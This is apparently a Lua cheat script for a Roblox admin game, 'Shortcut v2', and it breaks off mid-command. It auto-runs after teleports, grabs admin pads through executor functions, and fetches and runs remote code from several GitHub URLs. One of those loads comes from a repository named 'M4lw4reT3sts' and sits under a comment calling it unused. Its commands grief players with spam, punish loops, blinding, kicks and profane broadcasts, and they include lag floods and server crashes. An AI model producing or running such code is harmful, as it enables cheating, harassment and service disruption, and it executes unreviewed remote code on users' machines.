local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
getgenv().scriptrunning = true
getgenv().autoexecute = true

if autoexecute then
    queueteleport([[
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/Shortcut__v2_src2.lua'),true))()
    ]])
end

repeat task.wait() until game:IsLoaded()

function logn(message) -- Totally skidded, amirite Temmie
    game.StarterGui:SetCore("SendNotification",
        {
            Title = "NEW Shortcut v2",
            Text = message,
            Duration = 5.5
        })
end

local connections = {}

local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin

local soundvis = false

-- services
local rns = game:GetService("RunService")
local tps = game:GetService("TeleportService")
local http = game:GetService("HttpService")
local ws = game:GetService("Workspace")
local plyrs = game:GetService("Players")
local uis = game:GetService("UserInputService")

shared.gpcheck = true

shared.banana = {} -- For non-perms

-- ALL OF THE FOLLOWING ARE UNUSED
task.spawn(function()
    shared.sillock = {} 
    shared.gravlock = {}
    banscript1 = true
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/my-own-scripts-projects/main/APIPART2.lua'),true))()
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

_G.antiseiz = true
local Stable_Check = false
local rotation = Instance.new("BodyGyro")
local plrs = game:GetService("Players") -- I know they're like two of those but I imported this
local getplrs = plrs:GetChildren()
local plr = plrs.LocalPlayer
local mousee = game.Players.LocalPlayer:GetMouse()
local GC = getconnections or get_signal_cons
local Character = plr.Character or plr.CharacterAdded
local hum = Character:WaitForChild("Humanoid")
local Plrname = plr.Name
local userId = game.Players.LocalPlayer.UserId
getgenv().house_keybind = "n"
getgenv().reset_keybind = "c" -- This also shares with VAR

local Game_Folder = game:GetService("Workspace").Terrain["_Game"]
local Workspace_Folder = Game_Folder.Workspace

local customcmdstable = {}

game:GetService("Workspace").FallenPartsDestroyHeight = 0/0


local function chatt(massage)
    game.Players:Chat(massage)
end

local antilog = string.rep(0, math.random(16, 100))

local Utils = {
    Task = {}
}

local function trueblind()
    game.Players:Chat(":blind all")
    game.Players:Chat("fogcolor 0 0 0")
    game.Players:Chat("fogend nil")
    game.Players:Chat("brightness nan")
    game.Players:Chat("time -")
end

local sg = game:GetService("StarterGui")

function Utils.Task:wait(duration)
    if duration == nil or duration <= 0 then
        duration = 1
    end

    local measure = os.clock()
    duration = duration * 0.001

    repeat delta = task.wait() until os.clock() + delta >= measure + duration

    repeat if true then end until measure + duration <= os.clock()
    -- Simplified
end

function Utils:__wait()
	rns.Heartbeat:Wait()
end
function Utils.getPlr(str)
	local myInput = string.lower(str)
	for i,v in ipairs(plyrs:GetPlayers()) do
		if string.sub(string.lower(v.Character.Name), 1, #myInput) == myInput then 
		   return v.Character.Name
		end
	end
end

function Utils.ejectGUI()
    sg:SetCoreGuiEnabled("PlayerList", true)
    PlayerList:Destroy()
end

task.spawn(function()
    while scriptrunning do task.wait()
        coroutine.wrap(function() -- PadAbuse
			if padAbuse == true then
				local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
				for i, pad in pairs(pads) do
					coroutine.wrap(function()
						pcall(function()
							local cre = pad.Head
							local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
							firetouchinterest(cre, spr, 1)
                            firetouchinterest(cre, spr, 0)
                            firetouchinterest(cre, spr, 1)
							task.wait()
							firetouchinterest(cre, spr, 0)
							
							if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
								fireclickdetector(adminFlr.Regen.ClickDetector, 0)
							end
						end)
					end)()
				end
			end
        end)()
		
        coroutine.wrap(function() -- Perm
			local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
			if perm ~= true or adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil then 
			else
				pcall(function()
					local pad = adminFlr.Pads:FindFirstChild("Touch to get admin")
					local a = pad.Head
					firetouchinterest(a, spr, 1)
                    firetouchinterest(a, spr, 0)
                    firetouchinterest(a, spr, 1)
					task.wait()
					firetouchinterest(a, spr, 0)
				end)
			end
        end)()
    end
end)

--// Gamepass checker \\--

task.spawn(function()
    local passid = 66254 or 64354
    if shared.gpcheck == true then
        if string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. userId .. "/items/GamePass/" .. passid), passid) then
            print("Perm found")
            gamepassperm = true
            perm = false 
            print("Fake perm for those that didn't buy the gamepass. It's pointless if you do have it unless the API has an outage")
        else
            print("Perm not found. Enabling pad grabber")
            perm = true
        end
    end
end)

connections[#connections + 1] = mousee.Button1Down:Connect(function()
	pcall(function()
		local plr = mousee.Target.Parent.Parent
		for i,v in pairs(game.Players:GetPlayers()) do
			pcall(function()
				if mousee.Target.Parent:FindFirstChild("Humanoid") then
					plr = mousee.Target.Parent
				end
			end)
		end
		if plr ~= nil then
			if clickExplode then
				chatt("explode "..plr.Name)
			elseif clickAnnoy then
				chatt(prefix3.."annoy "..plr.Name)
            elseif clickFard then
                for i = 1, 128 do
				    chatt("smoke "..plr.Name.." "..plr.Name.." "..plr.Name)
                end
                wait(2.5)
                chatt("kill "..plr.Name)
                chatt("h \n\n\n\n\n\n LOL "..plr.Name.." DIED BY THEIR OWN STENCH \n\n\n\n\n\n")
			end
		end
	end)
end)

task.spawn(function()
    if nores1 then 
        nores2 = true
        return
     end
    nores1 = true
    nores2 = true
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    local RESPAWN_THRESHOLD = 5
    
    local respawnCount = 0
    local lastRespawnCount = 0
    local lastRespawnCheck = time()
    
    local function checkRespawnRate()
        local currentTime = time()
        if (currentTime - lastRespawnCheck) >= 1 then
            local respawnRate = respawnCount - lastRespawnCount
            if respawnRate > RESPAWN_THRESHOLD then
                if messagewentpast2 then return end
                messagewentpast2 = true
                logn("Use //forcelag if you're being spam respawned or refreshed")
                wait(30)
                messagewentpast2 = false
            end
            lastRespawnCount = respawnCount
            lastRespawnCheck = currentTime
        end
    end
    
    connections[#connections + 1] = game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
        respawnCount = respawnCount + 1
    end)
    
    connections[#connections + 1] = game:GetService("RunService").RenderStepped:Connect(function()
        task.spawn(function()
            if nores2 then
                checkRespawnRate()
            end
        end)
    end)
end)

getgenv().prefix3 = "//"
local admin = {prefix3 = prefix3, version = "v2"}
local commands = {}
local descriptions = {}
function addcommand(cmdName, cmdDescription, cmdFunction)
    commands[cmdName] = cmdName
    descriptions[cmdName] = cmdDescription
    connections[#connections + 1] = plr.Chatted:Connect(function(msg)
            msg = msg:lower()
            args = msg:split(" ")
            if args[1] == admin.prefix3 .. cmdName then
                cmdFunction()
            elseif args[1] == "/e" and args[2] == admin.prefix3 .. cmdName then
                args[2] = args[3]
                cmdFunction()
            end
        end)
end

function GetPlayer(target)
    local plrs = game:service("Players"):GetPlayers()
    if target:lower() == "all" then
        return plrs
    elseif target:lower() == "others" then
        for index, plr in pairs(plrs) do
            if plr == game:service("Players").LocalPlayer then
                table.remove(plrs, index)
                return plrs
            end
        end
    elseif target:lower() == "me" then
        return {game:service("Players").LocalPlayer}
    else
        local plrTargets = {}
        for index, plr in pairs(plrs) do
            if plr.Name:sub(1, #target):lower() == target:lower() or plr.DisplayName:sub(1, #target):lower() == target:lower()  then
                table.insert(plrTargets, plr)
            end
        end
        return plrTargets
    end
end

addcommand("migrate",
"No description",
function()
    while scriptrunning do wait(.35)
        task.spawn(function()
            local x = {}
            local amount = 1 or 2
            for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
                if type(v) == "table" and v.playing == 1 or v.playing == 2  and v.id ~= game.JobId then
                    x[#x + 1] = v.id
                    amount = 1 or 2
                end
            end
            if #x > 0 then
                logn("Joining a server with "..amount.." Players")
                wait(0.25)
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
            else
                if messagewentpast then return end
                messagewentpast = true
                logn("Waiting...")
                logn("Waiting...")
                logn("Unable to immediately join just yet. Waiting...")
            end
        end)
    end
end)

addcommand("permap", -- Perm Anti Punish
"No description",
function()
    permap = true
    coroutine.wrap(function()
        while permap and scriptrunning do
            task.wait(.0095)
            if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
                chatt("unpunish me " .. math.random(1, 1000))
                task.wait(.35)
                chatt("unpunish me " .. math.random(1, 1000))
            end
        end
end)()
end)

addcommand("nonpermap", -- Non-perm Anti Punish
"No description",
function()
    local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
getgenv().nonpermantipunish = true

coroutine.wrap(function()
while nonpermantipunish do task.wait()
if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
if not game:GetService("Workspace").Terrain["_Game"].Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name .. "'s admin") then
queueteleport([[
repeat task.wait() until game:IsLoaded()

local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin
local padAbuse = true
local perm = true
local loopres = true
local lc = {}

local mousee = game.Players.LocalPlayer:GetMouse()
local unloop_keybind = "x"

mousee.KeyDown:connect(function(key)
    if key:lower() == unloop_keybind then
        padAbuse = false
        loopres = false
        for _, connection in ipairs(lc) do
            connection:Disconnect()
        end
    end
end)

task.spawn(function()
while task.wait() do
coroutine.wrap(function()
    if padAbuse == true then
        local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
        for i, pad in pairs(pads) do
            coroutine.wrap(function()
                pcall(function()
                    local cre = pad.Head
                    local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                    firetouchinterest(cre, spr, 1)
                    firetouchinterest(cre, spr, 0)
                    firetouchinterest(cre, spr, 1)
                    task.wait()
                    firetouchinterest(cre, spr, 0)
                    
                    if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
                        fireclickdetector(adminFlr.Regen.ClickDetector, 0)
                    end
                end)
            end)()
        end
    end
end)()

coroutine.wrap(function() -- Perm
    local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
    if perm ~= true or adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil then 
    else
        pcall(function()
            local pad = adminFlr.Pads:FindFirstChild("Touch to get admin")
            local a = pad.Head
            firetouchinterest(a, spr, 1)
            firetouchinterest(a, spr, 0)
            firetouchinterest(a, spr, 1)
            task.wait()
            firetouchinterest(a, spr, 0)
        end)
    end
end)()
end
end)

task.wait()

function chat(plr)
    local connection = plr.Chatted:Connect(function(msg)
        if msg:lower():find("punish") or msg:lower():find("########") then
            if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
                game:GetService("Players").LocalPlayer.Character.Head:Destroy()
            end
        end
    end)
    table.insert(lc, connection)
end

for _, v in ipairs(game.Players:GetPlayers()) do
    chat(v)
end

game.Players.PlayerAdded:Connect(function(plr)
    chat(plr)
end)

local function dumbrobloxupdate(character)
    while loopres do
        pcall(function()
            local humanoid = character:WaitForChild("Humanoid")
            pcall(function()
                game:GetService("Players").LocalPlayer.Character.Head:Destroy()
            end)
            task.wait()
            pcall(function()
                game:GetService("Players").LocalPlayer.Character.Head:Destroy()
            end)
            game.Players:Chat(":punish                                                                                                                                others fuck "..math.random(1,1000))
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0, -499.4, 0))
            task.wait()
        end)
    end
end

lc[#lc+1] = game.Players.LocalPlayer.CharacterAdded:Connect(dumbrobloxupdate)
game:GetService("Players").LocalPlayer.Character.Head:Destroy()
]])
game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
else
game.Players:Chat("unpunish me")
game.Players:Chat("punish others")
end
end
end
end)()
end)

addcommand("annoy",
"No description",
function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
        spam = true
        while spam do Utils.Task:wait()
            chatt("unchar "..Target.Name.." "..Target.Name.." "..Target.Name)
        end
    end
end)

addcommand("punish",
"No description",
function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
        if noalteredp then 
            logn("The altered punish has been disabled")
            return
        end
        game.Players:Chat("unpunish "..Target.Name.." "..math.random(1,1000));task.wait()
        game.Players:Chat("invis "..Target.Name.." "..math.random(1,1000))
        game.Players:Chat(":refresh "..Target.Name.." "..math.random(1,1000))
        game.Players:Chat("invis "..Target.Name.." "..math.random(1,1000))
        game.Players:Chat(":kill "..Target.Name.." "..math.random(1,1000))
        game.Players:Chat("invis "..Target.Name.." "..math.random(1,1000))
        game.Players:Chat(":trip "..Target.Name.." "..math.random(1,1000))
        game.Players:Chat("invis "..Target.Name.." "..math.random(1,1000))
        game.Players:Chat("speed "..Target.Name.." 00000000000000000000000000000000000000000000")
        game.Players:Chat(":setgrav "..Target.Name.." -1000000000000000000000000000000000000000000000000000000000000000000000000000000000000");wait(.1)
        game.Players:Chat("speed "..Target.Name.." 00000000000000000000000000000000000000000000")
        game.Players:Chat("invis "..Target.Name.." "..Target.Name..""..Target.Name.." "..math.random(1,1000))
        game.Players:Chat(":unpunish "..Target.Name.." "..Target.Name.." "..Target.Name.." "..math.random(1,1000));task.wait(.2)
        game.Players:Chat("invis "..Target.Name.." "..math.random(1,1000));wait(.2)
        game.Players:Chat(":reset "..Target.Name.." "..math.random(1,1000));wait(.15)
        pcall(function()
            fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector, 0)
            chatt("iyc firecd")
        end)
        for i = 1, 20 do
        game.Players:Chat(":punish "..Target.Name.."                                                                                                 "..Target.Name.." "..Target.Name.."                                                                       "..math.random(1,1000))
        end
        game.Players:Chat("speed "..Target.Name.." 00000000000000000000000000000000000000000000")
        wait(1)
        game.Players:Chat("invis                                                                                                                                                 "..Target.Name.." "..math.random(1,1000));wait(.2)
        game.Players:Chat("removehats                                                                                                                                                 "..Target.Name.." "..math.random(1,1000));wait(.2)
    end
end)

addcommand("permcheck",
"No description",
function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
    local id1 = 66254
    local id2 = 64354
    task.wait()
    if string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. Target.UserId .. "/items/GamePass/" .. id1), id1) then
        permcheck1 = true
        logn(Target.Name..' has perm in NBC')
        permcheck1 = true
        task.spawn(function()
            wait(1.35)
            permcheck1 = false
        end)
    end
    if string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. Target.UserId .. "/items/GamePass/" .. id2), id2) then
        logn(Target.Name..' has perm in BC')
        game.Players:Chat("punish "..Target.Name);wait(4.65)
        bcbought = true
        local file = "fuck and cum"
        local a = {}

        for letter in file:gmatch(".") do
        if letter ~= "\r" and letter ~= "\n" then
            table.insert(a, letter)
        end
        end

        for i, v in ipairs(a) do
        print(i, v)
        end

        for b, c in ipairs(a) do
            local d = "variable_" .. tostring(b)
            _G[d] = c
        end
        for b, c in ipairs(a) do
            local e = string.rep("  ", 2 * (b - 1))
            game.Players:Chat("h/ lol look\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
        end
    else 
        if permcheck1 == true then return end
        logn(Target.Name..' does not have Perm')
    end
end
end)

addcommand("profilepos",
"No description",
function()
    if not syn then
        dofile("regprofile.lua")
    else
        logn('Execute the file manually from your workspace folder or use SW')
        logn('This function does not exist on Synapse.')
        pcall(function()
            dofile("regprofile.lua")
        end)
    end
end)

addcommand("regenprofile",
"No description",
function()
    local FileName = "regprofile.lua"
    if writefile and readfile then
        local ExistingFile = pcall(readfile, FileName)
        if not ExistingFile then
            -- pass
        else
            notify('r', 'Teleporting you to your profile coords instead')
            game.Players:Chat(prefix3.."profilepos")
            return notify('r', 'Regen profile has already been created')
        end
    end
    local part = game:GetService("Workspace").Terrain["_Game"].Admin.Regen
    shared.regencoords = part.Position
    local line = 'game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(' .. shared.regencoords.X .. ', ' .. shared.regencoords.Y .. ', ' .. shared.regencoords.Z .. ') -- Those are your personalized coords. Delete this file if you want to generate new coords'
    writefile("regprofile.lua", line)
    if not syn then
        dofile("regprofile.lua")
    else
        logn('Execute the file manually from your workspace folder or use SW')
        logn('This function has been disabled on Synapse.')
        pcall(function()
            dofile("regprofile.lua")
        end)
    end
end)

addcommand("deleteregen",
"No description",
function()
    chatt("gear me "..antilog.."108158379");task.wait()
    local function L_1_func()
        repeat task.wait()
        until game.Players.LocalPlayer.Backpack:FindFirstChild("IvoryPeriastron")
        game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.IvoryPeriastron)
    end
    local function L_2_func()
        repeat task.wait()
        until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
        local L_10_=game:GetService("Workspace").Terrain["_Game"]local L_11_=L_10_.Workspace;local L_12_=L_10_.Admin;local L_13_=game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")local L_14_=true
        spawn(function()
            while scriptrunning do
                game:GetService('RunService').Heartbeat:wait()
                game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
                L_13_.CFrame = L_12_.Regen.CFrame * CFrame.new(-1 * (L_12_.Regen.Size.X / 2) - (game.Players.LocalPlayer.Character['Torso'].Size.X / 2), 0, 0);task.wait()
                if not L_14_ then
                    break
                end
            end
        end)
        spawn(function()
            while L_14_ do task.wait(nil)
                chatt("unpunish me "..math.random(1,1000))
            end
        end);task.wait(0.3)
        L_14_ = false
    end
    local L_3_ = math.random(1, 2)
    task.spawn(function()
        local FileName = "regprofile.lua"
        if writefile and readfile then
            local ExistingFile = pcall(readfile, FileName)
            if not ExistingFile then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(math.random(-37876, 853406), math.random(-37876, 42407), math.random(-37876, 4359)))
            else
                game.Players:Chat(prefix3.."profilepos")
            end
        end
    end)
    wait(.35)
    chatt("setgrav me -550");task.wait()
    chatt("gear me 00000000000000000000000000000108158379")
    L_1_func();task.wait(.35)
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
    local L_4_ = {
        [1] = Enum.KeyCode.E
    }

    game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_4_));task.wait()
    repeat task.wait()
    until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");task.wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    chatt("unfly me");task.wait(.2)
    repeat
        L_2_func()

    until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld");task.wait()

    local L_5_ = {
        [1] = Enum.KeyCode.E
    }

    game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_5_))
    repeat task.wait()
    until not game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter")

    chatt("respawn me")
    L_1_func();task.wait(.35)
    local L_6_ = {
        [1] = Enum.KeyCode.E
    }

    game:GetService("Players").LocalPlayer.Character.IvoryPeriastron.Remote:FireServer(unpack(L_6_))
    repeat task.wait()
    until game:GetService("Workspace").Camera:FindFirstChild("FakeCharacter");task.wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(1, -498, 1))
    for L_15_forvar0, L_16_forvar1 in pairs(game:GetService("Workspace").Camera:GetChildren()) do
        if L_16_forvar1.Name == "FakeCharacter" then
            L_16_forvar1:Destroy()
        end
    end
end)

addcommand("nopadgrabber",
"No description",
function()
    perm = false
end)

addcommand("unantikill",
"No description",
function()
    ELFRGD = false
    logn("AntiKill is now Off")
end)

addcommand("breakcam",
"No description",
function()
    chatt("gear me "..antilog.."4842204072");wait(.35)
    chatt("gear me "..antilog.."4842218829");wait(.35)
    chatt("gear me "..antilog.."4842190633");wait(.35)
    chatt("gear me "..antilog.."4842207161");wait(.35)
    chatt("gear me "..antilog.."4842215723");wait(.35)
    chatt("gear me "..antilog.."4842212980");wait(.35)
    chatt("gear me "..antilog.."4842197274");wait(.35)
    chatt("gear me "..antilog.."4842186817");wait(.35)
    chatt("gear me "..antilog.."4842201032")
end)

addcommand("sunset",
"No description",
function()
    chatt("colorshifttop 600 400 10")
    chatt("colorshiftbottom 600 400 10")
    chatt("time 16")
end)

addcommand("fixclientcam",
"No description",
function()
    task.spawn(function()
        local lp = game.Players.LocalPlayer
        local ui = game:GetService("UserInputService")
        local l__ContextActionService__7 = game:GetService("ContextActionService");
        local l__RunService__1 = game:GetService('RunService')
        l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
        l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
        l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
        while true do
            repeat game:GetService'RunService'.Heartbeat:Wait() until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
            l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
            l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
            l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
            local wepsys = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
            if not wepsys then return end
            for i,v in pairs(wepsys:GetDescendants()) do
                if v:IsA("Script") then
                v.Disabled = true
                end
                v:Destroy()
            end
            local wep = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
            local gui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
            local sc = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
            if wep then wep.Disabled = true wep:Destroy() end
            if gui then gui:Destroy() end
            if sc then
                sc.Disabled = true
                sc:Destroy()
            end
            ui.MouseIconEnabled = true
            game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
            game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
            lp.Character.Humanoid.AutoRotate = true
        end
    end)
end)

addcommand("periastron",
"No description",
function()
    chatt("gear me "..antilog.."159229806");wait(1.5)
    chatt("gear me "..antilog.."233520257")
    chatt("gear me "..antilog.."120307951");wait(2.5)
    chatt("gear me "..antilog.."80661504")
    chatt("gear me "..antilog.."93136802");wait(.35)
    chatt("gear me "..antilog.."99119240")
    chatt("gear me "..antilog.."73829193");wait(.65)
    chatt("gear me "..antilog.."139577901")
    chatt("gear me "..antilog.."2544549379");wait(3)
end)

addcommand("tempcrash",
"No description",
function()
    game.Players:Chat("god all")
    game.Players:Chat("gear me 92628079");wait(.35)
    for i,v in pairs(game.Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
        if v:IsA("Tool") or v:IsA("HopperBin") then
            v.Parent = game.Players.LocalPlayer.Character
        end
    end
    wait(.35)
    local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
    for _, v in ipairs(Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
        v:Activate()
    end
    wait(.35)
    local VirtualUser = game:GetService("VirtualUser")
    VirtualUser:CaptureController()
    VirtualUser:ClickButton1(Vector2.new())
    wait(.39)
    for i = 1, 5 do
    game.Players:Chat("unsize me me me "..math.random(1,1000))
    end
    wait(1)
    finished = true
    task.spawn(function()
    wait(2.5)
    game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):UnequipTools()
    wait(5)
    finished = false
    game.Players:Chat("ungear me")
    end)
    task.spawn(function()			
    local StatsService = game:GetService("Stats")
    local ping1 = string.split(StatsService.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1]
    task.wait(.4)
    while finished do task.wait(.2)
        local ping2 = string.split(StatsService.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1]
        if ping2 ~= ping1 then
            if ratelimit3 then return end
            ratelimit3 = true
            for i = 1, 5 do
            if not finished then return end
            game.Players:Chat("unsize me me me "..math.random(1,1000))
            end
            wait(2.51)
            ratelimit3 = false
            --finished = false
        end
    end
end)
end)

addcommand("ivory",
"No description",
function()
    chatt("gear me "..antilog.."108158379")
end)

addcommand("crazycolors",
"No description",
function()
    chatt("fogend nil")
    colors = true
end)

addcommand("fixpaint",
"No description",
function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Qltxi/scripts/main/Color%20API%202.0"),true))()
end)

addcommand("messpaint",
"No description",
function()
    chatt("gear me "..antilog.."18474459")
    wait(1)
    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
    wait(0.25)
    for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
        task.spawn(function()
            if v:IsA("Part") then
                local Partse =
                {
                    ["Part"] = v,
                    ["Color"] = Color3.new(math.random(0, 255), math.random(0, 255), math.random(0, 255))
                }
                game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Partse)
            end
        end)
    end
end)

addcommand("noplayerlist",
"No description",
function()
    Utils.ejectGUI()
end)

addcommand("forcelag",
"No description",
function()
trueblind()
wait(.49)
for i = 1, 350 do
    game.Players:Chat("unchar all all all")
end
wait(5.01)
for i = 1, 350 do
	game.Players:Chat(":gear all 253519495")
end
while task.wait() do
    game.Players:Chat(":gear all 253519495")
end
end)

addcommand("unloopgrab",
"No description",
function()
    padAbuse = false
end)

addcommand("loopgrab",
"No description",
function()
    padAbuse = true
end)

addcommand("antikill",
"No description",
function()
    ELFRGD = true
    chatt(prefix3.."nok")
    if ELFRGD == true then
        if KGODglobal == true then
            return
        end
        pcall(function()
            getgenv().KGODglobal = true
        end)
        connections[#connections + 1] = game.Players.LocalPlayer.CharacterAdded:connect(function()
            task.wait(.65)
            chatt("god                                                                                                                               me fuck " .. math.random(1, 1000))
        end)
        logn("AntiKill is now On")
    end
end)

addcommand("nok",
"No description",
function()
    pcall(function()
        local objs = game:GetService("Workspace").Terrain._Game.Workspace.Obby:GetChildren()
        for i, obj in pairs(objs) do
            coroutine.wrap(function()
                pcall(function()
                    obj.TouchInterest:Destroy()
                end)
            end)()
        end
    end)
end)

addcommand("toregen",
"No description",
function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/FindVerticalRegen"), true))()
end)

addcommand("kick",
"Kick a player",
function()
    -- This kick is nerfed. Var has way better kicks
    local playercount = game.Players:GetPlayers()
    if #playercount == 2 then
        trueblind()
        chatt("skydive                                                                                                                                  me me me")
        chatt("skydive                                                                                                                                  me me me")
        chatt("skydive                                                                                                                                  me me me");wait(.51)
        chatt(prefix3.."vgcrash");wait(.51)
        chatt(prefix3.."migrate")
        return 
    end
    if #playercount == 3 then
        logn("Not enough players")
        return
    end
    trueblind()
    for i = 1, 128 do
        chatt("dog                                                                                                          others others others fuck "..math.random(1,1000))
    end;task.wait(.39)
    for i = 1, 128 do
        chatt("dog                                                                                                          others others others fuck "..math.random(1,1000))
    end;task.wait(.39)
    for i = 1, 90 do
        chatt("dog                                                                                                          others others others fuck "..math.random(1,1000))
    end;task.wait(.56)
    chatt("tp                                                                                                          others others");wait(.49)
    chatt("tp "..Target.Name.." others");wait(.51)
    chatt("tp "..Target.Name.." others");wait(.51)
    chatt("tp "..Target.Name.." others")
    chatt("sit "..player);wait(.51)
    chatt("kill "..Target.Name.." "..math.random(1,1000));wait(2.5)
    chatt("respawn others");wait()
    pcall(function()
        execCmd("nofog")
        execCmd("day")
        execCmd("brightness 1")
    end)
    chatt("unblind                                                                                    me")
    chatt("jump others")
end
)

addcommand("cmds",
"Commands list",
function()
    logn("Then scroll down as a slider will appear")
    logn("Open the console with F9")
    print([[
Your prefix is "//"
Usage/example: //spam explode random
or //sunset
etc






cmds
mboombox (string) - Boombox script, requires boombox to already be in your inventory
spam (command)
annoy (player) - Spam respawn a player
stop - stop spamming 
toregen - Teleport to the regen pad
vgcrash - Crash the server using the vampire gear
silcrash - (REQUIRES PERSON299'S ADMIN) Silently crash the server
fixpaint - Restore the map colors to how it originally was (we were the first to have this fully fixed with credit to siyamicik and boomanoid)
messpaint - Mess up the map paint instead by painting everything random
breakcam - Break the server camera
fixclientcam - This will only fix YOUR CAMERA. For anyone else it will stay broken
migrate - Look for an empty/clean server and join it. There's no ping check though so if that server is located on the other side of the world then that sucks for you lmao
sunset - Sets the map theme to this.
periastron - This gives you all periastron swords EXCEPT FOR THE IVORY
ivory - This will give you the ivory specifically. It has been separated due to the ivory having many uses outside of just being an ordinary periastron sword, an example of that is attaching and moving parts or objects by using the Ivory's server sided after making your character weld to a part
tempcrash - Temporarily crash the server
iy - Load up Infinite Yield.
crazycolors - This will hurt peoples eyes. Use the stop command to stop it
nopadgrabber - Disable the padgrabber that will automatically get a pad if your account doesn't have perm
permcheck (player) - Check if a player has perm
punish (Player) - Altered punish, it's buffed and can only be bypassed using respawn or unchar
forcelag - Use this command in emergencies. To stop it, you have to rejoin entirely (Requires admin of course)
tempcrash - Temporarily crash the server using the blue tempcrash sword
kick (Player) - Kick a player using the shitty dog method (scv3-var has a way better method)

classicmode - Run old SCV2 instead. This script is very outdated and poorly put together and also very memory heavy, but some people still like it because it more commands (no wonder). Keep in mind that old v2 is over a year old by now






Shortcut v2, mostly scripted by Tech
with help from

Yeemi - Made most of base SCV2 and some of it has been re-used in the remake
Miia - Made some of base SCV2 and owns the project
Jotunn - Made the command handler
Vecko - Additional code
Whatjg - Additional code
Quiving - Additional code
Shade4Real - Additional code

This project is still alive and well as of 6/9/2023 so you can contribute as well, and your name will appear in the credits]])
end)

addcommand("silcrash",
"Silent crash",
function()
    getgenv().nonpermantipunish = false
    for i = 1, 40 do
        game.Players:Chat(":punish/                                                                                                                                       me fuck")
        wait(.51)
